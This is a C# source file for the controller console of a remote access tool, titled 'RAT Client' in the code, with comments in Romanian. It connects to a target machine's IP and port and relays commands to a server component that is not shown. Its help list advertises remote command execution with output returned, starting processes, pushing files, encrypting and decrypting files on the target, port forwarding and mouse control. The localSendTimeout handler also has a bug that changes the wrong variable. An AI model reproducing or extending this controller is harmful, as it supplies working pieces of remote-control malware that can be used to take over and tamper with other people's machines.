using System;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Client
{
    class Client
    {
        static string host = "127.0.0.1";
        static int port = 12750;
        static int receiveBuffer = 8192;
        static int sendBuffer = 8192;
        static int receiveTimeout = 30000;
        static int sendTimeout = 30000;
        static StreamWriter outputWriter; //log-uri
        static string outputFile = $"LOG_{DateTime.Now.ToString("yyyy-M-dd_HH-mm-ss")}.txt"; //log-uri

        static void Main(string[] args)
        {
            Console.Title = "RAT Client";

            Console.Write("Target IP address (blank for localhost): ");
            string ipInput = Console.ReadLine();
            if (ipInput != String.Empty)
                host = ipInput;
            Console.Write("Port (blank for 12750): ");
            string portInput = Console.ReadLine();
            if (portInput != String.Empty)
                Int32.TryParse(portInput, out port);
            Console.WriteLine();

            Console.Title = $"RAT Client - {host}:{port}";

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            Socket testSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint hostEndPoint = new IPEndPoint(IPAddress.Parse(host), port);

            while (true)
            {
                try
                {
                    testSocket.Connect(hostEndPoint);
                    Console.WriteLine($"Connected to {host}:{port}.");
                    //cam inutil send-ul asta
                    testSocket.Send(Encoding.ASCII.GetBytes("connected"));
                    testSocket.Shutdown(SocketShutdown.Both);
                    testSocket.Close();
                    break;
                }
                catch
                {
                    Console.WriteLine($"Failed to connect to {host}:{port}. Retrying...");
                    if (testSocket.Connected)
                    {
                        testSocket.Shutdown(SocketShutdown.Both);
                        testSocket.Close();
                    }
                }
            }

            while (true) //cred ca pot sa pun true
            {
                try
                {
                    //sa bag astea in try
                    Console.Write(">>> ");
                    string message = Console.ReadLine();
                    List<string> commandArgs = Regex.Split(message,
                        "(?<=^[^\"]*(?:\"[^\"]*\"[^\"]*)*) (?=(?:[^\"]*\"[^\"]*\")*[^\"]*$)").ToList();

                    if (commandArgs[0] == "exit" || commandArgs[0] == "quit") Environment.Exit(0);

                    else if (commandArgs[0] == "help") PrintHelp();

                    #region LOCAL COMMANDS
                    else if (commandArgs[0] == "localReceiveBuffer")
                    {
                        if (commandArgs.Count >= 2 && !String.IsNullOrWhiteSpace(commandArgs[1]))
                        {
                            Int32.TryParse(commandArgs[1], out receiveBuffer);
                            Console.WriteLine($"Local receive buffer size set to {receiveBuffer}.\n");
                        }
                        else
                            Console.WriteLine($"Local receive buffer size is {receiveBuffer}.\n");
                    }

                    else if (commandArgs[0] == "localSendBuffer")
                    {
                        if (commandArgs.Count >= 2 && !String.IsNullOrWhiteSpace(commandArgs[1]))
                        {
                            Int32.TryParse(commandArgs[1], out sendBuffer);
                            Console.WriteLine($"Local send buffer size set to {sendBuffer}.\n");
                        }
                        else
                            Console.WriteLine($"Local send buffer size is {sendBuffer}.\n");
                    }

                    else if (commandArgs[0] == "localReceiveTimeout")
                    {
                        if (commandArgs.Count >= 2 && !String.IsNullOrWhiteSpace(commandArgs[1]))
                        {
                            Int32.TryParse(commandArgs[1], out receiveTimeout);
                            Console.WriteLine($"Local receive timeout set to {receiveTimeout}.\n");
                        }
                        else
                            Console.WriteLine($"Local receive timeout is {receiveTimeout}.\n");
                    }

                    else if (commandArgs[0] == "localSendTimeout")
                    {
                        if (commandArgs.Count >= 2 && !String.IsNullOrWhiteSpace(commandArgs[1]))
                        {
                            Int32.TryParse(commandArgs[1], out receiveTimeout);
                            Console.WriteLine($"Local receive timeout set to {sendTimeout}.\n");
                        }
                        else
                            Console.WriteLine($"Local receive timeout is {sendTimeout}.\n");
                    }
                    #endregion

                    else if (!String.IsNullOrWhiteSpace(message))
                    {
                        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        socket.ReceiveBufferSize = receiveBuffer;
                        socket.SendBufferSize = sendBuffer;
                        socket.ReceiveTimeout = receiveTimeout;
                        socket.SendTimeout = sendTimeout;

                        socket.Connect(hostEndPoint);

                        NetworkStream networkStream = new NetworkStream(socket);
                        BinaryWriter binaryWriter = new BinaryWriter(networkStream);
                        BinaryReader binaryReader = new BinaryReader(networkStream);

                        if (commandArgs[0] == "send")
                        {
                            if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), commandArgs[1].Trim('"'))) ||
                                File.Exists(commandArgs[1].Trim('"')))
                            {
                                //ca sa stie server-ul ca trebuie sa mai astepte un flux
                                SendMessage(binaryWriter, message);

                                byte[] fileBytes = File.ReadAllBytes(commandArgs[1].Trim('"'));
                                binaryWriter.Write(fileBytes);

                                byte[] bytes = new byte[receiveBuffer];
                                binaryReader.Read(bytes);
                                bytes = bytes.TakeWhile((v, index) => bytes.Skip(index).Any(w => w != 0x00)).ToArray();
                                string response = Encoding.ASCII.GetString(bytes);
                                Console.WriteLine(response);
                                Console.WriteLine();
                            }
                            else
                            {
                                Console.WriteLine("Invalid file name(s).");
                                Console.WriteLine();
                            }
                        }

                        else
                        {
                            SendMessage(binaryWriter, message);

                            byte[] bytes = new byte[receiveBuffer];
                            binaryReader.Read(bytes);
                            bytes = bytes.TakeWhile((v, index) => bytes.Skip(index).Any(w => w != 0x00)).ToArray();
                            string response = Encoding.ASCII.GetString(bytes);

                            StreamWriter outputWriter = new StreamWriter(outputFile, true);
                            outputWriter.WriteLine($"======== {DateTime.Now.ToString("yyyy-M-dd_HH-mm-ss")} ========");
                            outputWriter.WriteLine($"{response}\n");
                            outputWriter.Close();

                            Console.WriteLine(response);
                            Console.WriteLine();
                        }

                        networkStream.Close();
                        binaryWriter.Close();
                        binaryReader.Close();
                        socket.Shutdown(SocketShutdown.Both);
                        socket.Close();
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine($"LOCAL ERROR: {e.Message}.");
                    Console.WriteLine();
                }
            }
        }

        static void SendMessage(BinaryWriter writer, string input)
        {
            byte[] data = Encoding.ASCII.GetBytes(input);
            writer.Write(data);
        }

        static void PrintHelp()
        {
            Console.WriteLine("help - prints this list");
            Console.WriteLine("localReceiveBuffer bufferSize - sets the local receive buffer size; default is 8192");
            Console.WriteLine("localSendBuffer bufferSize - sets the local send buffer size; default is 8192");
            Console.WriteLine("remoteReceiveBuffer bufferSize - sets the remote receive buffer size; default is 8192");
            Console.WriteLine("remoteSendBuffer bufferSize - sets the remote send buffer size; default is 8192");
            Console.WriteLine("localReceiveTimeout - sets the local receive timeout in ms; default is 30000 ms");
            Console.WriteLine("remoteSendTimeout - sets the remote send timeout in ms; default is 30000 ms");
            Console.WriteLine("send fileToSend fileToReceive - sends a file; check the buffer sizes before");
            Console.WriteLine("beep [frequency] [duration] - plays a beep sound on the target machine");
            Console.WriteLine("process processName [args] - starts a process");
            Console.WriteLine("cmd [args] - executes a cmd command and returns the STDOUT");
            Console.WriteLine("encrypt fileToEncrypt outputFile password - encrypts a file");
            Console.WriteLine("decrypt fileToDecrypt outputFile password - decrypts a file");
            Console.WriteLine("openport protocol privatePort publicPort description - forwards a port");
            Console.WriteLine("mouse xPos yPos - moves the mouse to the specified coordinates");
            Console.WriteLine("exit - exits the tool");
            Console.WriteLine("quit - exits the tool");
            Console.WriteLine();
        }
    }
}
